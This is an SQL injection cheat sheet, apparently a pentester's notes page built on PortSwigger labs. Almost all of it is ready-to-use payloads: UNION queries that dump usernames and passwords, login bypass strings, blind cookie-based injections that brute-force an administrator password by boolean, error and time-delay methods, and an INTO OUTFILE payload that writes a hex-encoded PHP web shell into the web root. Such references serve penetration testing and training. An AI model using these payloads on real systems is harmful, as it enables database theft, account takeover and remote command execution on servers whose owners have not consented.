---
title: SQL Injection Cheat Sheet
desc: Cheat Sheet for SQL injection.
tags: [Database, SQLi, Web]
alts: [Sqlmap]
website: https://portswigger.net/web-security/sql-injection/cheat-sheet
render_with_liquid: false
---

*URL encode as neeeded.  

*Last char is `--` or `#`.

<br />

## Examples

```html
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
' UNION SELECT username,password FROM users--
' UNION SELECT username || '~' || password FROM users--
' UNION SELECT NULL,username || '~' || password FROM users--
' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'--
<!-- BINARY: sensive to upper_case and lower_case -->
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'--

<!-- MySQL, Microsoft  -->
' UNION SELECT @@version--
' UNION SELECT @@version#
' UNION SELECT NULL,@@version--
' UNION SELECT NULL,@@version#
<!-- Oracle -->
' UNION SELECT 'a' FROM dual--
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT * FROM v$version--
' UNION SELECT BANNER,NULL FROM v$version--
<!-- PostgreSQL -->
' UNION SELECT version()--

<!-- Get table name -->
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL FROM all_tables--
<!-- Get column name -->
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='users_abcdef'--
<!-- Get values in column -->
' UNION SELECT username_ghijkl,password_mnopqr FROM users_abcdef--
```

<br />

## Login form

```html
admin'--
admin'#
admin' OR 1=1--
admin' OR 1=1#
```

<br />

## Blind SQL

```html
<!-- HTTP response -->
Cookie: TrackingId=abcde' AND '1'='1
Cookie: TrackingId=abcde' AND '1'='2
Cookie: TrackingId=abcde' AND (SELECT 'a' FROM users LIMIT 1)='a
<!-- Check if username 'administrator' exists in 'users' -->
Cookie: TrackingId=abcde' AND (SELECT 'a' FROM users WHERE username='administrator')='a
<!-- If so, determine the password length -->
Cookie: TrackingId=abcde' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
Cookie: TrackingId=abcde' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
...
Cookie: TrackingId=abcde' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
<!-- Brute force password char by char ($a$ is the target of brute force) -->
Cookie: TrackingId=abcde' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
Cookie: TrackingId=abcde' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$
...
Cookie: TrackingId=abcde' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$

<!-- HTTP response condition error -->
Cookie: TrackingId=abcde'
Cookie: TrackingId=abcde''
Cookie: TrackingId=abcde'||(SELECT '')||'
Cookie: TrackingId=abcde'||(SELECT '' FROM dual)||'
Cookie: TrackingId=abcde'||(SELECT '' FROM fake_table)||'
Cookie: TrackingId=abcde'||(SELECT '' FROM users WHERE ROWNUM = 1||'
Cookie: TrackingId=abcde'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Cookie: TrackingId=abcde'|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
<!-- Check if username 'administrator' exists in 'users' -->
Cookie: TrackingId=abcde'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
<!-- If so, determine the password length -->
Cookie: TrackingId=abcde''||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Cookie: TrackingId=abcde''||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...
Cookie: TrackingId=abcde''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
<!-- Brute force password char by char ($a$ is the target of brute force) -->
Cookie: TrackingId=abcde'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Cookie: TrackingId=abcde'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...
Cookie: TrackingId=abcde'||(SELECT CASE WHEN SUBSTR(password,8,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

<!-- Time delay -->
Cookie: TrackingId=abcde'||pg_sleep(10)--
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
<!-- Check if username 'administrator' exists in 'users' -->
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
<!-- If so, determine the password length -->
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
...
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
<!-- Brute force password char by char ($a$ is the target of brute force) -->
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
...
Cookie: TrackingId=abcde'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

<br />

## Write file

- Write new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
- Access to http://10.0.0.1/shell.php?cmd=whoami

```html
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E--
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
```